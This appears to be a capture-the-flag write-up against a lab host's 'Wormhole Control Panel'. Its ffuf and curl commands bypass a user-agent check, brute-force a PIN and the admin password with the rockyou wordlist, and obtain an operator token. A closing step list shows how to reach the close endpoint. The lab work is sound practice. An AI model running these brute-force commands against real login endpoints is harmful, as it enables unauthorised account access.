

```bash
ffuf -u http://10.48.188.126/terminal.php?action=panel -d "username=admin&password=FUZZ&pin=FUZ2Z" -w /usr/share/wordlists/rockyou.txt:FUZZ -w <(seq 4000 5000):FUZ2Z -fs 1500 -t 50
```


```bash
$curl -A "secretcomputer" http://10.48.188.126/terminal.php?action=panel
{
    "service": "Wormhole Control Panel",
    "endpoints": {
        "\/terminal.php?action=info": "Public info",
        "\/terminal.php?action=login": "POST: username,password",
        "\/terminal.php?action=pin": "POST: attempt PIN to get temporary admin token",
        "\/terminal.php?action=status": "GET: wormhole status",
        "\/terminal.php?action=close": "POST: close wormhole"
    },
    "note": "This panel only answers to terminal user agents. Use the endpoints to fully close the wormhole."
}

```

```bash
$ curl -A "secretcomputer" http://10.48.188.126/terminal.php?action=status
{
    "wormhole": "OPEN",
    "note": "Admin information hidden. Authenticate and obtain operator token."
}
$ curl -A "secretcomputer" http://10.48.188.126/terminal.php?action=info
{
    "title": "Bunny Control Panel",
    "desc": "The rabbits hide the wormhole state and protect closure behind both a session and a token. You will need to authenticate and obtain the operator token."
}
```

```bash
# Brute Force for PIN
ffuf -t 20 -timeout 8 \
-w pins.txt:PW  \
-u "http://10.48.188.126/terminal.php?action=pin"  \
-X POST  \
-H "User-Agent: secretcomputer" \
-H "Content-Type: application/x-www-form-urlencoded"  \
-d "pin=PW"  \
-fs 74
```

```bash
# Get X-Operator operator token
curl -s \
  -A "secretcomputer" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST \
  -d "pin=4731" \
  "http://10.48.188.126/terminal.php?action=pin"
```

## pin: 4731
## username: admin

```bash
$ curl -A "secretcomputer" -X POST -d "pin=4731" http://10.48.188.126/terminal.php?action=pin
{
    "status": "ok",
    "operator_token": "79f7bad69f2c0ace4612075cdeb877432fba218b3fec00d1c23f93919ca94090",
    "note": "This token is valid for the day. Use it as Bearer or X-Operator header."
}
{
    "status": "ok",
    "operator_token": "79f7bad69f2c0ace4612075cdeb877432fba218b3fec00d1c23f93919ca94090",
    "note": "This token is valid for the day. Use it as Bearer or X-Operator header."
}
```

```bash
# Test Login
curl -A "secretcomputer" -H "X-Operator: 79f7bad69f2c0ace4612075cdeb877432fba218b3fec00d1c23f93919ca94090" -X POST -d "username=admin&password=alexandrina" http://10.48.188.126/terminal.php?action=login
```
### Brute Force Attack

```bash
# Brute Force for password (with username=admin and X-Operator Header)
ffuf -t 20 -timeout 8 \
-w /usr/share/wordlists/rockyou.txt:PWD  \
-u "http://10.48.188.126/terminal.php?action=login"  \
-X POST  \
-H "User-Agent: secretcomputer" \
-H "Content-Type: application/x-www-form-urlencoded"  \
-H "X-Operator: 79f7bad69f2c0ace4612075cdeb877432fba218b3fec00d1c23f93919ca94090"
-d "username=admin&password=PWD"  \
-fs 74
```

# Steps
1. Get the pin using above script
2. Make a request with that pin and get the operator token
3. Use this operator token in login as header 'X-Operator' and make a brute force attack using rockyou.txt
4. If you got the password then make a login request with 'username: admin', 'password: (that you got after brute force)' and 'X-Operator: (operator token)' and get the session token
5. Make a request to 'action=close' using 'operator token' and 'session token'